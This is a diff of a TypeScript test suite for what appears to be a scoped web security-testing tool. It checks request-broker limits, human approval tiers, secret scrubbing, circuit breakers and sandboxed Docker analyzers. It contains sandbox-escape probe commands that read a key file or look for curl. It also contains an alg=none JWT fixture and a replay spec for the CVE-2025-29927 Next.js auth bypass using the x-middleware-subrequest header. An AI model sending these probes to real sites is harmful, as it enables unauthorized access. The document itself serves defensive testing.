+      privateBroker.executeHttp({ origin: northstar, method: 'GET', pathAndQuery: '/' }, makeGrant({ allowLocalLab: true }), AbortSignal.timeout(5_000)),
+      /public addresses/,
+    )
+    process.env.GUARDIAN_ALLOW_LOCAL_LAB = '1'
+    await assert.rejects(
+      privateBroker.executeHttp({ origin: northstar, method: 'GET', pathAndQuery: '/' }, makeGrant({ allowLocalLab: false }), AbortSignal.timeout(5_000)),
+      /public addresses/,
+    )
+    const labBroker = new RequestBroker({
+      resolve: async () => [{ address: '127.0.0.1', family: 4 }],
+      transport: async () => ({ status: 200, headers: { 'content-type': 'text/plain' }, body: 'local-lab-ok' }),
+    })
+    const labRes = await labBroker.executeHttp(
+      { origin: northstar, method: 'GET', pathAndQuery: '/lab' },
+      makeGrant({ allowLocalLab: true }),
+      AbortSignal.timeout(5_000),
+    )
+    assert.equal(labRes.status, 200)
+    assert.equal(labRes.body, 'local-lab-ok')
+  } finally {
+    if (prevEnv === undefined) delete process.env.GUARDIAN_ALLOW_LOCAL_LAB
+    else process.env.GUARDIAN_ALLOW_LOCAL_LAB = prevEnv
+  }
+
+  // Abort while DNS is unresolved must never dial
+  const lookupPending = Promise.withResolvers<PublicAddress[]>()
+  const abortBroker = new RequestBroker({
+    resolve: () => lookupPending.promise,
+    transport: async () => { throw new Error('Dialed after abort') },
+  })
+  const ac = new AbortController()
+  const reqPromise = assert.rejects(
+    abortBroker.executeHttp({ origin: northstar, method: 'GET', pathAndQuery: '/' }, makeGrant(), ac.signal),
+    /revoked/,
+  )
+  ac.abort(new Error('scope revoked'))
+  await reqPromise
+  lookupPending.resolve([publicAddr])
+
+  // 8-hop redirect chain succeeds when every hop is in scope; 9th hop fails; out-of-scope hop fails
+  let hopCount = 0
+  const eightHopBroker = new RequestBroker({
+    resolve: async () => [publicAddr],
+    transport: async url => {
+      hopCount += 1
+      const step = Number(url.searchParams.get('hop') ?? '0')
+      if (step < 8) {
+        return { status: 302, headers: { location: `/?hop=${step + 1}` } }
+      }
+      return { status: 200, headers: { 'content-type': 'text/plain' }, body: 'landed-hop-8' }
+    },
+  })
+  const eightRes = await eightHopBroker.executeHttp(
+    { origin: northstar, method: 'GET', pathAndQuery: '/?hop=0', followRedirects: true },
+    makeGrant(),
+    AbortSignal.timeout(5_000),
+  )
+  assert.equal(eightRes.body, 'landed-hop-8')
+  assert.equal(hopCount, 9) // initial + 8 redirects
+
+  const nineHopBroker = new RequestBroker({
+    resolve: async () => [publicAddr],
+    transport: async url => {
+      const step = Number(url.searchParams.get('hop') ?? '0')
+      return { status: 302, headers: { location: `/?hop=${step + 1}` } }
+    },
+  })
+  await assert.rejects(
+    nineHopBroker.executeHttp({ origin: northstar, method: 'GET', pathAndQuery: '/?hop=0', followRedirects: true }, makeGrant(), AbortSignal.timeout(5_000)),
+    /redirect limit/,
+  )
+
+  const escapeBroker = new RequestBroker({
+    resolve: async () => [publicAddr],
+    transport: async () => ({ status: 302, headers: { location: 'https://unapproved.example/leak' } }),
+  })
+  await assert.rejects(
+    escapeBroker.executeHttp({ origin: northstar, method: 'GET', pathAndQuery: '/', followRedirects: true }, makeGrant(), AbortSignal.timeout(5_000)),
+    /outside.*scope/,
+  )
+
+  // Path > 8 KiB and raw Authorization/Cookie headers are rejected
+  await assert.rejects(
+    eightHopBroker.executeHttp({ origin: northstar, method: 'GET', pathAndQuery: '/' + 'a'.repeat(8193) }, makeGrant(), AbortSignal.timeout(5_000)),
+    /8 KiB/,
+  )
+  await assert.rejects(
+    eightHopBroker.executeHttp(
+      { origin: northstar, method: 'GET', pathAndQuery: '/', headers: { Authorization: 'Bearer nope' } },
+      makeGrant(),
+      AbortSignal.timeout(5_000),
+    ),
+    /cannot be set directly/,
+  )
 })
 
-test('requires a local Docker Unix socket before staging worker data', async () => {
-  const previous = process.env.DOCKER_HOST
+// ============================================================================
+// 2. Tier 0-3 Capability Enforcement & Tier 3 Blocking HITL Approve/Deny
+// ============================================================================
+
+test('enforces Tiers 0-3 capabilities and Tier 3 HITL approval requests', async t => {
+  const broker = new RequestBroker({
+    resolve: async () => [publicAddr],
+    transport: async (_url, _addr, _sig, opts) => ({
+      status: 200,
+      headers: { 'content-type': 'application/json' },
+      body: JSON.stringify({ ok: true, method: opts?.method }),
+    }),
+  })
+  const sig = AbortSignal.timeout(5_000)
+
+  // Tier 0 blocks all live traffic
+  await assert.rejects(broker.executeHttp({ origin: northstar, method: 'GET', pathAndQuery: '/' }, makeGrant({ tier: 0 }), sig), /Tier 0/)
+  await assert.rejects(broker.inspectDns(northstar, makeGrant({ tier: 0 }), sig), /Tier 0/)
+  await assert.rejects(broker.inspectTls(northstar, makeGrant({ tier: 0 }), sig), /Tier 0/)
+
+  // Tier 1 allows GET/HEAD/OPTIONS, blocks POST and executeBatch
+  const t1 = await broker.executeHttp({ origin: northstar, method: 'GET', pathAndQuery: '/health' }, makeGrant({ tier: 1 }), sig)
+  assert.equal(t1.status, 200)
+  await assert.rejects(broker.executeHttp({ origin: northstar, method: 'POST', pathAndQuery: '/mutate' }, makeGrant({ tier: 1 }), sig), /Tier 3/)
+  await assert.rejects(
+    broker.executeBatch([
+      { origin: northstar, method: 'GET', pathAndQuery: '/a' },
+      { origin: northstar, method: 'GET', pathAndQuery: '/b' },
+    ], makeGrant({ tier: 1 }), sig),
+    /Tier 2 or Tier 3/,
+  )
+
+  // Tier 2 allows synchronized executeBatch (2..10) and allowlisted idempotent POST, blocks non-idempotent POST
+  const batch = await broker.executeBatch([
+    { origin: northstar, method: 'GET', pathAndQuery: '/r1' },
+    { origin: northstar, method: 'GET', pathAndQuery: '/r2' },
+    { origin: northstar, method: 'GET', pathAndQuery: '/r3' },
+  ], makeGrant({ tier: 2 }), sig)
+  assert.equal(batch.length, 3)
+
+  const gqlOk = await broker.executeHttp(
+    { origin: northstar, method: 'POST', pathAndQuery: '/graphql', body: '{"query":"{ __typename }"}' },
+    makeGrant({ tier: 2, isIdempotentPostAllowed: (_o, p) => p === '/graphql' }),
+    sig,
+  )
+  assert.equal(gqlOk.status, 200)
+  await assert.rejects(
+    broker.executeHttp({ origin: northstar, method: 'PUT', pathAndQuery: '/items/1' }, makeGrant({ tier: 2 }), sig),
+    /Tier 3/,
+  )
+
+  // Tier 3 throws BrokerApprovalRequired until approved
+  await assert.rejects(
+    broker.executeHttp(
+      { origin: northstar, method: 'POST', pathAndQuery: '/state-probe' },
+      makeGrant({ tier: 3, isStateChangeApproved: () => false }),
+      sig,
+    ),
+    err => err instanceof BrokerApprovalRequired,
+  )
+  const approvedRes = await broker.executeHttp(
+    { origin: northstar, method: 'POST', pathAndQuery: '/state-probe' },
+    makeGrant({ tier: 3, isStateChangeApproved: (_o, m, p) => m === 'POST' && p === '/state-probe' }),
+    sig,
+  )
+  assert.equal(approvedRes.status, 200)
+
+  // Store-level HITL approval request lifecycle (approve + deny)
+  const dir = mkdtempSync(join(tmpdir(), 'guardian-hitl-'))
+  t.after(() => rmSync(dir, { recursive: true, force: true }))
+  const storage = new Store(dir)
+  t.after(() => storage.close())
+  const { id: projectId } = storage.createProject({ requestId: randomUUID(), name: 'HITL', seeds: [northstar], environment: 'public' })
+  const { id: runId } = storage.createRun({
+    requestId: randomUUID(), projectId, goal: 'Tier 3 test', sourceMode: 'public',
+    capabilityTier: 3, budgetUsd: 25, budgetRequests: 100, maxRpsPerOrigin: 5, workerConcurrency: 2, workerMaxTurns: 20,
+  })
+  storage.command({ requestId: randomUUID(), runId, action: 'discover', consent: true })
+  const asset = storage.run(runId).candidates[0]
+  storage.command({ requestId: randomUUID(), runId, action: 'scope', expectedScopeRevision: 0, assetIds: [asset.id], consent: true, capabilityTier: 3 })
+  const worker = storage.makeWorker(storage.run(runId), 'investigation', asset, 'Probe', 'Test approval')
+  const req1 = storage.createApprovalRequest(storage.run(runId), worker, {
+    origin: northstar, method: 'POST', pathAndQuery: '/eval', rationale: 'Safe dynamic math proof', requestPreview: 'POST /eval',
+  })
+  const req2 = storage.createApprovalRequest(storage.run(runId), worker, {
+    origin: northstar, method: 'POST', pathAndQuery: '/other', rationale: 'Second probe', requestPreview: 'POST /other',
+  })
+  assert.equal(storage.listApprovalRequests(runId, 'pending').length, 2)
+  storage.command({ requestId: randomUUID(), runId, action: 'decide_approval', approvalId: req1.id, decision: 'approved' })
+  storage.command({ requestId: randomUUID(), runId, action: 'decide_approval', approvalId: req2.id, decision: 'denied' })
+  assert.equal(storage.getApprovalRequest(runId, req1.id).status, 'approved')
+  assert.equal(storage.getApprovalRequest(runId, req2.id).status, 'denied')
+})
+
+// ============================================================================
+// 3. Persona Vault Isolation & Zero Secret Leaks
+// ============================================================================
+
+test('isolates persona secrets at 0600, strips auth on cross-origin redirect, and prevents leaks across exchanges/artifacts/exports', async t => {
+  const dir = mkdtempSync(join(tmpdir(), 'guardian-persona-vault-'))
+  t.after(() => rmSync(dir, { recursive: true, force: true }))
+  const storage = new Store(dir)
+  t.after(() => storage.close())
+
+  const rawSecret = 'super-secret-tenant-a-jwt-token-88123'
+  const { id: projectId } = storage.createProject({ requestId: randomUUID(), name: 'Vault Test', seeds: [northstar, docsOrigin], environment: 'public' })
+  const created = createProjectPersona(storage, {
+    requestId: randomUUID(),
+    projectId,
+    handle: 'tenant_a',
+    roleLabel: 'Standard Tenant A',
+    originAllowlist: [northstar], // docsOrigin NOT in persona allowlist
+    authKind: 'bearer',
+    secret: rawSecret,
+    canaryMarkers: ['TENANT_A_MARKER'],
+  })
+
+  // Public listing never exposes raw secret
+  const pubList = listProjectPersonas(storage, projectId)
+  assert.equal(pubList.length, 1)
+  assert.ok(!JSON.stringify(pubList).includes(rawSecret))
+
+  // Credential file on disk is strictly 0600
+  const credFiles = readFileSync(join(dir, 'guardian.sqlite'))
+  assert.ok(!credFiles.includes(rawSecret), 'Raw persona secret must never be stored in SQLite.')
+  const credDir = join(dir, 'credentials')
+  const { readdirSync } = await import('node:fs')
+  const files = readdirSync(credDir)
+  assert.equal(files.length, 1)
+  assert.equal(statSync(join(credDir, files[0])).mode & 0o777, 0o600)
+
+  const { id: runId } = storage.createRun({
+    requestId: randomUUID(), projectId, goal: 'Persona isolation check', sourceMode: 'public',
+    capabilityTier: 2, budgetUsd: 25, budgetRequests: 100, maxRpsPerOrigin: 10, workerConcurrency: 2, workerMaxTurns: 20,
+  })
+  storage.command({ requestId: randomUUID(), runId, action: 'discover', consent: true })
+  const allAssets = storage.run(runId).candidates
+  storage.command({
+    requestId: randomUUID(), runId, action: 'scope', expectedScopeRevision: 0,
+    assetIds: allAssets.map(a => a.id), consent: true, capabilityTier: 2, approvedPersonaIds: [created.id],
+  })
+
+  const resolvedPersonas = resolveRunPersonas(storage, projectId, [created.id])
+  const secrets = personaSecrets(resolvedPersonas)
+  const sentAuthByOrigin: Array<{ origin: string; auth?: string }> = []
+
+  const broker = new RequestBroker({
+    resolve: async () => [publicAddr],
+    transport: async (url, _addr, _sig, opts) => {
+      sentAuthByOrigin.push({ origin: url.origin, auth: opts?.headers?.Authorization })
+      if (url.origin === northstar && url.pathname === '/redirect-cross') {
+        return { status: 302, headers: { location: docsOrigin + '/landing' } }
+      }
+      // Echo back the secret in response body & header to prove broker scrubs it before returning!
+      return {
+        status: 200,
+        headers: { 'content-type': 'application/json', 'x-echo': rawSecret },
+        body: JSON.stringify({ echoedSecret: rawSecret, user: 'tenant_a' }),
+      }
+    },
+  })
+
+  const grant = makeGrant({
+    tier: 2,
+    personas: resolvedPersonas,
+    secrets,
+    canRead: o => o === northstar || o === docsOrigin,
+  })
+
+  // Direct request to origin NOT in persona.originAllowlist is rejected
+  await assert.rejects(
+    broker.executeHttp({ origin: docsOrigin, method: 'GET', pathAndQuery: '/private', persona: 'tenant_a' }, grant, AbortSignal.timeout(5_000)),
+    /originAllowlist/,
+  )
+
+  // Cross-origin redirect from allowlisted northstar -> docsOrigin injects on hop 1, STRIPS on hop 2
+  const redirEx = await broker.executeHttp(
+    { origin: northstar, method: 'GET', pathAndQuery: '/redirect-cross', persona: 'tenant_a', followRedirects: true },
+    grant,
+    AbortSignal.timeout(5_000),
+  )
+  assert.deepEqual(sentAuthByOrigin, [
+    { origin: northstar, auth: 'Bearer ' + rawSecret },
+    { origin: docsOrigin, auth: undefined },
+  ])
+  // Even when the server echoes the secret, the broker scrubs it to [persona:tenant_a:secret]
+  assert.ok(!JSON.stringify(redirEx).includes(rawSecret))
+  assert.ok(redirEx.body.includes('[persona:tenant_a:secret]'))
+
+  // Persist into exchanges, facts, artifacts, report, and Markdown export -> zero leaks anywhere!
+  const run = storage.run(runId)
+  const primaryAsset = run.candidates.find(c => c.origin === northstar)!
+  const worker = storage.makeWorker(run, 'investigation', primaryAsset, 'Persona check', 'Inspect response')
+  const savedEx = storage.recordExchange({
+    runId: run.id,
+    assignmentId: worker.id,
+    scopeRevision: run.scopeRevision,
+    origin: redirEx.origin,
+    finalOrigin: redirEx.finalOrigin,
+    redirectOrigins: redirEx.redirectOrigins,
+    method: redirEx.method,
+    pathAndQuery: redirEx.pathAndQuery,
+    personaHandle: redirEx.personaHandle,
+    status: redirEx.status,
+    mediaType: redirEx.mediaType,
+    reqHeaders: redirEx.reqHeaders,
+    respHeaders: redirEx.respHeaders,
+    body: redirEx.body,
+    durationMs: redirEx.durationMs,
+    secrets,
+  })
+  const ftsHits = storage.searchExchanges(runId, 'tenant_a', { approvedOrigins: new Set([northstar, docsOrigin]) })
+  assert.ok(ftsHits.some(h => h.id === savedEx.id))
+  storage.addFact(run, worker, {
+    kind: 'auth',
+    origin: northstar,
+    summary: `Observed token ${rawSecret}`,
+    data: { leak: rawSecret },
+    exchangeIds: [savedEx.id],
+    secrets,
+  })
+  const artifact = storage.addArtifact(run, worker, 'analysis', 'Leak check', JSON.stringify({ secret: rawSecret }), undefined, secrets)
+  assert.ok(!storage.artifact(runId, artifact.id).content.includes(rawSecret))
+
+  storage.writeReport(storage.run(runId), false)
+  const report = storage.runDetail(runId).reports[0]
+  assert.ok(report)
+  const markdown = exportReportMarkdown(storage, runId, report.id).content
+  assert.ok(!markdown.includes(rawSecret), 'Raw persona secret leaked into Markdown export!')
+})
+
+// ============================================================================
+// 4. Sliding-Window 5xx / 429 Defensive Circuit Breaker
+// ============================================================================
+
+test('opens defensive circuit breaker on 5xx and 429 spikes and blocks further traffic', async () => {
+  const audits: string[] = []
+  let transportCalls = 0
+  const broker5xx = new RequestBroker({
+    resolve: async () => [publicAddr],
+    transport: async () => {
+      transportCalls += 1
+      return { status: 503, headers: { 'content-type': 'text/plain' }, body: 'unavailable' }
+    },
+    circuit5xxThreshold: 5,
+    circuitWindowMs: 30_000,
+  })
+  const grant = makeGrant({ audit: outcome => audits.push(outcome) })
+  for (let i = 0; i < 4; i += 1) {
+    const res = await broker5xx.executeHttp({ origin: northstar, method: 'GET', pathAndQuery: `/p${i}` }, grant, AbortSignal.timeout(5_000))
+    assert.equal(res.status, 503)
+  }
+  await assert.rejects(
+    broker5xx.executeHttp({ origin: northstar, method: 'GET', pathAndQuery: '/p4' }, grant, AbortSignal.timeout(5_000)),
+    err => err instanceof BrokerCircuitOpen,
+  )
+  assert.equal(broker5xx.isCircuitOpen(northstar), true)
+  assert.ok(audits.includes('circuit_open'))
+
+  // Subsequent request fails fast without dialing transport
+  const callsBefore = transportCalls
+  await assert.rejects(
+    broker5xx.executeHttp({ origin: northstar, method: 'GET', pathAndQuery: '/p5' }, grant, AbortSignal.timeout(5_000)),
+    err => err instanceof BrokerCircuitOpen,
+  )
+  assert.equal(transportCalls, callsBefore)
+
+  // 429 sliding window threshold (8)
+  const broker429 = new RequestBroker({
+    resolve: async () => [publicAddr],
+    transport: async () => ({ status: 429, headers: { 'content-type': 'text/plain' }, body: 'slow down' }),
+    circuit429Threshold: 8,
+    circuitWindowMs: 30_000,
+  })
+  for (let i = 0; i < 7; i += 1) {
+    const res = await broker429.executeHttp({ origin: northstar, method: 'GET', pathAndQuery: `/r${i}` }, makeGrant(), AbortSignal.timeout(5_000))
+    assert.equal(res.status, 429)
+  }
+  await assert.rejects(
+    broker429.executeHttp({ origin: northstar, method: 'GET', pathAndQuery: '/r7' }, makeGrant(), AbortSignal.timeout(5_000)),
+    err => err instanceof BrokerCircuitOpen,
+  )
+  assert.equal(broker429.isCircuitOpen(northstar), true)
+})
+
+// ============================================================================
+// 5. Persistent --network none Intent Container, Analyzers, Abort Kill & Orphan Cleanup
+// ============================================================================
+
+test('enforces --network none intent container, NDJSON staging, all offline analyzers, instant abort kill, and orphan cleanup', { timeout: 30_000 }, async t => {
+  // Reject non-Unix DOCKER_HOST
+  const prevDockerHost = process.env.DOCKER_HOST
   try {
     process.env.DOCKER_HOST = 'tcp://docker.example:2376'
-    await assert.rejects(new LinuxWorkerBackend().run({
-      assignmentId: randomUUID(), files: [], command: 'true', outputs: [],
-    }, new AbortController().signal), /local Docker Unix socket/)
+    await assert.rejects(
+      new LinuxWorkerBackend().run({ assignmentId: randomUUID(), files: [], command: 'true', outputs: [] }, AbortSignal.timeout(5_000)),
+      /local Docker Unix socket/,
+    )
   } finally {
-    if (previous === undefined) delete process.env.DOCKER_HOST
-    else process.env.DOCKER_HOST = previous
+    if (prevDockerHost === undefined) delete process.env.DOCKER_HOST
+    else process.env.DOCKER_HOST = prevDockerHost
   }
-})
 
-test('runs pipelines in the production just-bash image with read-only evidence and bounded output', async () => {
-  const backend = new LinuxWorkerBackend()
-  const job = {
-    assignmentId: randomUUID(),
-    files: [
-      { name: 'observed.json', content: '{"transportMaxAge":31536000,"source":"prepared"}' },
-      { name: 'baseline.txt', content: '31536000\n' },
-    ],
-    outputs: ['result.txt'],
-  }
-  const result = await backend.run({
-    ...job,
-    command: [
-      "jq -r '.transportMaxAge' /evidence/observed.json | sort > /work/actual.txt",
-      "diff /evidence/baseline.txt /work/actual.txt || exit 9",
-      "cat /root/.config/guardian.key 2>/dev/null && exit 11",
-      "command -v curl >/dev/null && exit 12",
-      "printf 'Matched baseline.\n' > /work/result.txt",
-    ].join('\n'),
-  }, new AbortController().signal)
-  assert.equal(result.exitCode, 0, result.stderr)
-  assert.equal(result.outputs['result.txt'], 'Matched baseline.\n')
-  await assert.rejects(backend.run({
-    ...job, command: "printf 'changed' > /evidence/observed.json",
-  }, new AbortController().signal))
-})
+  const wsDirA = mkdtempSync(join(tmpdir(), 'guardian-ws-a-'))
+  const wsDirB = mkdtempSync(join(tmpdir(), 'guardian-ws-b-'))
+  t.after(() => {
+    rmSync(wsDirA, { recursive: true, force: true })
+    rmSync(wsDirB, { recursive: true, force: true })
+  })
 
-test('enforces the worker container boundary independently of just-bash', { timeout: 19_000 }, async () => {
-  const gateway = (await exec('docker', ['network', 'inspect', 'bridge', '--format', '{{(index .IPAM.Config 0).Gateway}}'])).stdout.trim()
-  const target = await fixture((_request, response) => response.end('healthy'), gateway)
+  const backendA = new LinuxWorkerBackend({ workspace: { id: 'ws-a', directory: wsDirA } })
   const assignmentId = randomUUID()
-  const abort = new AbortController()
-  const pending = new LinuxWorkerBackend().run({
-    assignmentId, files: [], command: 'sleep 10', outputs: [],
-  }, abort.signal)
-  const stopped = assert.rejects(pending)
+  const sessionAbort = new AbortController()
+  const session = await backendA.openSession(assignmentId, sessionAbort.signal)
+  t.after(() => session.close())
+
+  // Verify container host config & zero network reachability to Docker bridge gateway
+  const gateway = (await exec('docker', ['network', 'inspect', 'bridge', '--format', '{{(index .IPAM.Config 0).Gateway}}'])).stdout.trim()
+  const hostFixture = await httpFixture((_req, res) => res.end('host-secret'), gateway)
+  t.after(() => hostFixture.close())
+
+  let containerId = ''
+  for (let attempt = 0; attempt < 60 && !containerId; attempt += 1) {
+    containerId = (await exec('docker', ['ps', '-q', '--filter', 'label=dev.guardian.assignment=' + assignmentId])).stdout.trim()
+    if (!containerId) await delay(50)
+  }
+  assert.ok(containerId, 'Persistent intent container must be running.')
+  const hostConfig = JSON.parse((await exec('docker', ['inspect', '--format', '{{json .HostConfig}}', containerId])).stdout)
+  assert.equal(hostConfig.NetworkMode, 'none')
+  assert.equal(hostConfig.Privileged, false)
+  assert.equal(hostConfig.ReadonlyRootfs, true)
+  assert.ok(hostConfig.Memory >= 1 && hostConfig.Memory <= 512 * 1024 * 1024)
+  assert.ok(hostConfig.NanoCpus >= 1 && hostConfig.NanoCpus <= 1_000_000_000)
+  assert.ok(hostConfig.PidsLimit >= 1 && hostConfig.PidsLimit <= 96)
+  assert.match(hostConfig.Tmpfs['/tmp'], /size=64m/)
+  assert.equal(hostConfig.Binds, null)
+
+  const probe = [
+    'if (process.getuid() !== 10001) process.exit(11)',
+    "if (require('node:fs').existsSync('/var/run/docker.sock')) process.exit(12)",
+    "if (process.env.OPENROUTER_API_KEY || process.env.GUARDIAN_DATA_DIR) process.exit(13)",
+    "fetch(process.argv[1], {signal: AbortSignal.timeout(700)}).then(() => process.exit(14), () => console.log('blocked'))",
+  ].join('\n')
+  const probeRes = await exec('docker', ['exec', containerId, 'node', '-e', probe, hostFixture.url])
+  assert.equal(probeRes.stdout.trim(), 'blocked')
+
+  // NDJSON staging + just-bash exec + read-only /evidence
+  const stagedPath = await session.stage('bundle.js', [
+    'fetch("/api/v2/admin/users");',
+    'window.addEventListener("message", e => { document.body.innerHTML = e.data; });',
+    'const k = "AKIAIOSFODNN7EXAMPLE";',
+    '//# sourceMappingURL=bundle.js.map',
+  ].join('\n'), AbortSignal.timeout(10_000))
+  assert.equal(stagedPath, '/evidence/bundle.js')
+
+  const execRes = await session.exec(
+    'rg -o "/api/v2/[a-z/]+" /evidence/bundle.js > /work/found.txt',
+    ['found.txt'],
+    AbortSignal.timeout(10_000),
+  )
+  assert.equal(execRes.exitCode, 0)
+  assert.equal(execRes.outputs['found.txt'].trim(), '/api/v2/admin/users')
+
+  // Read-only /evidence cannot be mutated
+  await assert.rejects(
+    session.exec("printf 'bad' > /evidence/bundle.js", [], AbortSignal.timeout(10_000)),
+    /EROFS|read-only/i,
+  )
+
+  // Test ALL offline analyzers inside the persistent --network none container
+  const jsOut = await session.analyze('js-harvest', { file: 'bundle.js' }, AbortSignal.timeout(10_000))
+  assert.ok((jsOut.apiPaths as string[]).includes('/api/v2/admin/users'))
+  assert.ok((jsOut.sourceMaps as string[]).includes('bundle.js.map'))
+  assert.ok((jsOut.domSinks as string[]).includes('message-listener'))
+
+  const secretOut = await session.analyze('secret-scan', { file: 'bundle.js' }, AbortSignal.timeout(10_000))
+  assert.ok((secretOut.matches as Array<{ kind: string }>).some(m => m.kind === 'aws-access-key'))
+
+  const techOut = await session.analyze('tech-fingerprint', {
+    url: northstar,
+    headers: { 'x-powered-by': 'Next.js 14.2.20', 'x-nextjs-cache': 'HIT' },
+    body: '<script src="/_next/static/chunks/main.js"></script>',
+  }, AbortSignal.timeout(10_000))
+  assert.ok((techOut.technologies as Array<{ package: string; version?: string }>).some(x => x.package === 'next' && x.version === '14.2.20'))
+
+  const fakeJwt = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url') + '.' +
+    Buffer.from(JSON.stringify({ sub: 'u1', role: 'admin' })).toString('base64url') + '.'
+  const jwtOut = await session.analyze('jwt-inspect', { text: fakeJwt }, AbortSignal.timeout(10_000))
+  assert.equal(jwtOut.valid, true)
+  assert.ok((jwtOut.warnings as string[]).some(w => w.includes('alg=none')))
+
+  const gqlOut = await session.analyze('graphql-parse', {
+    text: JSON.stringify({
+      data: {
+        __schema: {
+          queryType: { name: 'Query' },
+          types: [{ name: 'Query', kind: 'OBJECT', fields: [{ name: 'viewer' }, { name: 'adminSecrets' }] }],
+        },
+      },
+    }),
+  }, AbortSignal.timeout(10_000))
+  assert.equal(gqlOut.introspectionEnabled, true)
+  assert.ok((gqlOut.queries as string[]).includes('adminSecrets'))
+
+  const diffOut = await session.analyze('diff-response', {
+    control: { status: 200, mediaType: 'text/html', body: '<!doctype html><html><body><div id="root">My SPA App Shell</div></body></html>' },
+    probe: { status: 200, mediaType: 'text/html', body: '<!doctype html><html><body><div id="root">My SPA App Shell</div></body></html>' },
+  }, AbortSignal.timeout(10_000))
+  assert.equal(diffOut.likelySpaCatchall, true)
+
+  const dnsOut = await session.analyze('dns-takeover', {
+    hostname: 'dangling.northstar.example',
+    cnames: ['ghost-app.github.io'],
+    a: [],
+    aaaa: [],
+    status: 404,
+    body: "There isn't a GitHub Pages site here.",
+  }, AbortSignal.timeout(10_000))
+  assert.equal(dnsOut.likelyTakeover, true)
+
+  // Instant kill on sessionAbort
+  sessionAbort.abort(new Error('scope revoked'))
+  for (let i = 0; i < 40; i += 1) {
+    const alive = (await exec('docker', ['ps', '-q', '--filter', 'id=' + containerId])).stdout.trim()
+    if (!alive) break
+    await delay(100)
+  }
+  assert.equal((await exec('docker', ['ps', '-q', '--filter', 'id=' + containerId])).stdout.trim(), '')
+
+  // Orphan cleanup removes abandoned container for ws-a while preserving ws-b's container
+  const { createHash } = await import('node:crypto')
+  const { realpathSync } = await import('node:fs')
+  const ownerHash = (id: string, d: string) => createHash('sha256').update(id).update('\0').update(realpathSync(d)).digest('hex')
+  const orphanA = 'guardian-' + randomUUID()
+  const foreignB = 'guardian-' + randomUUID()
+  await exec('docker', [
+    'container', 'create', '--name', orphanA, '--network', 'none',
+    '--label', `dev.guardian.workspace=${ownerHash('ws-a', wsDirA)}`, 'guardian-worker:local', '--session',
+  ])
+  await exec('docker', [
+    'container', 'create', '--name', foreignB, '--network', 'none',
+    '--label', `dev.guardian.workspace=${ownerHash('ws-b', wsDirB)}`, 'guardian-worker:local', '--session',
+  ])
+  t.after(async () => {
+    await exec('docker', ['container', 'rm', '--force', orphanA, foreignB]).catch(() => undefined)
+  })
+  await backendA.reclaimInactive()
+  assert.equal((await exec('docker', ['ps', '-a', '-q', '--filter', 'name=' + orphanA])).stdout.trim(), '')
+  assert.ok((await exec('docker', ['ps', '-a', '-q', '--filter', 'name=' + foreignB])).stdout.trim())
+})
+
+// ============================================================================
+// 6. Runtime Tech Fingerprint + CVE Broker (CVE-2025-29927) & SPA Catch-all Immunity
+// ============================================================================
+
+test('correlates CVE-2025-29927 hypothesis, confirms vulnerable fixture, rules out edge-blocked, and rejects SPA catch-all', async () => {
+  const prevOffline = process.env.GUARDIAN_OFFLINE
+  process.env.GUARDIAN_OFFLINE = '1'
   try {
-    assert.equal(await fetch(target.url, { signal: AbortSignal.timeout(3_000) }).then(res => res.text()), 'healthy')
-    const filter = 'label=dev.guardian.assignment=' + assignmentId
-    let container = ''
-    for (let attempt = 0; attempt < 70 && !container; attempt += 1) {
-      container = (await exec('docker', ['ps', '-q', '--filter', filter])).stdout.trim()
-      if (!container) await delay(50)
-    }
-    assert.ok(container, 'The real worker container must be running during this check.')
-    const config = JSON.parse((await exec('docker', ['inspect', '--format', '{{json .HostConfig}}', container])).stdout)
-    assert.equal(config.NetworkMode, 'none')
-    assert.equal(config.Privileged, false)
-    assert.ok(config.ReadonlyRootfs)
-    assert.ok(config.Memory >= 1 && config.Memory <= 256 * 1024 * 1024)
-    assert.ok(config.NanoCpus >= 1 && config.NanoCpus <= 500_000_000)
-    assert.ok(config.PidsLimit >= 1 && config.PidsLimit <= 48)
-    assert.match(config.Tmpfs['/tmp'], /size=8m/)
-    assert.equal(config.Binds, null)
-    const probe = [
-      'if (process.getuid() !== 10001) process.exit(11)',
-      "if (require('node:fs').existsSync('/var/run/docker.sock')) process.exit(12)",
-      "if (process.env.OPENROUTER_API_KEY || process.env.GUARDIAN_DATA_DIR) process.exit(13)",
-      "fetch(process.argv[1], {signal: AbortSignal.timeout(700)}).then(() => process.exit(14), () => console.log('blocked'))",
-    ].join('\n')
-    const result = await exec('docker', ['exec', container, 'node', '-e', probe, target.url])
-    assert.equal(result.stdout.trim(), 'blocked')
+    const advisories = await queryCves({ ecosystem: 'npm', package: 'next', version: '14.2.20' })
+    const cve = advisories.find(a => a.id === 'CVE-2025-29927')
+    assert.ok(cve, 'Curated CVE-2025-29927 advisory must be returned for Next.js.')
+    assert.equal(cve.severity, 'critical')
   } finally {
-    abort.abort()
-    await stopped
-    await target.close()
+    if (prevOffline === undefined) delete process.env.GUARDIAN_OFFLINE
+    else process.env.GUARDIAN_OFFLINE = prevOffline
+  }
+
+  const backend = new LinuxWorkerBackend()
+  const cveReplaySpec: DeclarativeReplaySpec = {
+    ...replayBaseFields(northstar),
+    kind: 'http_chain',
+    title: 'Next.js Middleware Auth Bypass (CVE-2025-29927)',
+    cwe: 'CWE-287',
+    severity: 'critical',
+    spaCatchallControl: true,
+    steps: [
+      {
+        id: 'control',
+        role: 'control',
+        description: 'Request /admin without spoofed middleware header (expect 401/403/302).',
+        request: { origin: northstar, method: 'GET', pathAndQuery: '/admin', followRedirects: false },
+      },
+      {
+        id: 'probe',
+        role: 'probe',
+        description: 'Request /admin with x-middleware-subrequest header.',
+        request: {
+          origin: northstar,
+          method: 'GET',
+          pathAndQuery: '/admin',
+          headers: { 'x-middleware-subrequest': 'middleware:middleware:middleware:middleware:middleware' },
+          followRedirects: false,
+        },
+      },
+    ],
+    assertionsJq: `{
+      controlPassed: (.steps.control.status == 401 or .steps.control.status == 403 or .steps.control.status == 302),
+      confirmed: (.steps.probe.status == 200 and (.steps.probe.body | contains("admin_panel_secret_view")) and ((.spaCatchall.allProbesMatchedCatchall // false) | not)),
+      observed: ("control=" + (.steps.control.status | tostring) + ", probe=" + (.steps.probe.status | tostring)),
+      expected: "401/403 on both control and probe"
+    }`,
+  }
+
+  // Case A: Vulnerable fixture -> confirmed
+  let mode: 'vulnerable' | 'edge_blocked' | 'spa_catchall' = 'vulnerable'
+  const broker = new RequestBroker({
+    resolve: async () => [publicAddr],
+    transport: async (url, _addr, _sig, opts) => {
+      if (mode === 'spa_catchall') {
+        return {
+          status: 200,
